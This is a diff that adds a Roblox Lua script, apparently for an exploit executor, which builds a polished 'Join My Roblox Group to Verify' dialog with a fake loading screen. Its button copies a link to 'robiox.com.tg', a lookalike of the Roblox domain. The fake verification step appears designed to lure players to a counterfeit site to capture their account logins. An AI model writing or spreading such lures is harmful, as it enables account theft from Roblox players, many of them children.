@@ -1,0 +1,125 @@
+-- Professional UI with Smooth Loading + Copy Button (textbox removed)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local clipboard = setclipboard or toclipboard
+
+-- ScreenGui Setup
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.ResetOnSpawn = false
+gui.Name = "VerifyUI"
+
+-- MAIN FRAME
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 250)
+frame.Position = UDim2.new(0.5, -200, 0.5, -125)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+frame.BorderSizePixel = 0
+frame.Visible = false
+frame.ZIndex = 3
+frame.Parent = gui
+
+-- Rounded edges + shadow
+local corner = Instance.new("UICorner", frame)
+corner.CornerRadius = UDim.new(0, 15)
+
+local shadow = Instance.new("ImageLabel", frame)
+shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+shadow.Position = UDim2.new(0.5, 0, 0.5, 8)
+shadow.Size = UDim2.new(1, 40, 1, 40)
+shadow.Image = "rbxassetid://1316045217"
+shadow.ImageTransparency = 0.6
+shadow.BackgroundTransparency = 1
+shadow.ZIndex = 2
+shadow.Parent = frame
+
+-- Title Label
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "Join My Roblox Group to Verify"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.ZIndex = 4
+
+-- Invalid Key Label (kept in case you want to reuse)
+local invalid = Instance.new("TextLabel", frame)
+invalid.Size = UDim2.new(1, 0, 0, 30)
+invalid.Position = UDim2.new(0, 0, 0.62, 0)
+invalid.BackgroundTransparency = 1
+invalid.Text = ""
+invalid.Font = Enum.Font.GothamSemibold
+invalid.TextSize = 16
+invalid.TextColor3 = Color3.fromRGB(255, 70, 70)
+invalid.ZIndex = 4
+
+-- Copy Link Button (moved to center where textbox was)
+local copyBtn = Instance.new("TextButton", frame)
+copyBtn.Size = UDim2.new(0.6, 0, 0, 45)
+copyBtn.Position = UDim2.new(0.2, 0, 0.45, 0) -- moved up to textbox area
+copyBtn.Text = "Copy Group Link"
+copyBtn.Font = Enum.Font.GothamBold
+copyBtn.TextSize = 18
+copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+copyBtn.BorderSizePixel = 0
+copyBtn.ZIndex = 4
+Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 12)
+
+local gradient = Instance.new("UIGradient", copyBtn)
+gradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 150, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 120, 255))
+})
+
+-- Hover effect
+copyBtn.MouseEnter:Connect(function()
+	copyBtn.BackgroundColor3 = Color3.fromRGB(80, 140, 255)
+end)
+copyBtn.MouseLeave:Connect(function()
+	copyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+end)
+
+-- Clipboard function
+local groupLink = "https://www.robiox.com.tg/communities/173346377700/Nigoat"
+copyBtn.MouseButton1Click:Connect(function()
+	if clipboard then
+		clipboard(groupLink)
+		copyBtn.Text = "Copied!"
+		task.wait(1.5)
+		copyBtn.Text = "Copy Group Link"
+	end
+end)
+
+-- LOADING SCREEN
+local loading = Instance.new("Frame")
+loading.Size = frame.Size
+loading.Position = frame.Position
+loading.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+loading.BorderSizePixel = 0
+loading.ZIndex = 5
+loading.Parent = gui
+
+Instance.new("UICorner", loading).CornerRadius = UDim.new(0, 15)
+
+local loadingText = Instance.new("TextLabel", loading)
+loadingText.Size = UDim2.new(1, 0, 1, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading..."
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 28
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.ZIndex = 6
+
+-- Smooth fade effect
+task.wait(1.5)
+for i = 0, 1, 0.05 do
+	loading.BackgroundTransparency = i
+	loadingText.TextTransparency = i
+	task.wait(0.05)
+end
+
+-- Remove loading and show frame
+loading:Destroy()
+frame.Visible = true
